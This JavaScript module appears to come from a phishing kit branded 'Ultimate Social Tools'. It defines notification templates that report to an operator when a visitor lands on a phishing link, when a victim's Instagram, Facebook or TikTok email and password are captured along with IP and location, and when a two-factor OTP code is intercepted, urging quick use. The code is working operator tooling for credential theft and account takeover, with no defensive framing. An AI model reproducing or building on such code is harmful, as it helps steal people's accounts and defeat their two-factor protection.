async function visitorNotification(linkname){
    return `
🎯 <b>NEW VISITOR DETECTED!</b> 🎯

🔍 <b>Link Name:</b> <code>${linkname}</code>
⚡️ Visitor is on the page
🕒 Waiting for action...

💫 <i>Stay tuned for login details!</i>
🔒 <i>Secured by Ultimate Social Tools</i>
    `;
}

async function loginNotification(email, password, platform, ip, city, country){
    const platformEmoji = platform.toLowerCase() === 'instagram' ? '📸' : 
                         platform.toLowerCase() === 'facebook' ? '👥' : 
                         platform.toLowerCase() === 'tiktok' ? '🎵' : '🌐';

    return `
🎉 <b>NEW LOGIN CAPTURED!</b> 🎉

${platformEmoji} <b>Platform:</b> ${platform}
📧 <b>Email/Username:</b> <code>${email}</code>
🔑 <b>Password:</b> <code>${password}</code>

📍 <b>Location Details:</b>
🌍 Country: ${country}
🏙️ City: ${city}
🔒 IP: <code>${ip}</code>

⚡️ Login details captured successfully!
🎯 Ready to use

🔒 <i>Secured by Ultimate Social Tools</i>
    `;
}

async function otpNotification(otp, platform){
    const platformEmoji = platform.toLowerCase() === 'instagram' ? '📸' : 
                         platform.toLowerCase() === 'facebook' ? '👥' : 
                         platform.toLowerCase() === 'tiktok' ? '🎵' : '🌐';
    
    return `
🔐 <b>NEW 2FA CODE INTERCEPTED!</b> 🔐

${platformEmoji} <b>Platform:</b> ${platform}
🔑 <b>OTP Code:</b> <code>${otp}</code>

⚡️ Code captured successfully!
⏰ Valid for a limited time
🎯 Use it quickly!

🔒 <i>Secured by Ultimate Social Tools</i>
    `;
}

module.exports = {
    visitorNotification,
    loginNotification,
    otpNotification
}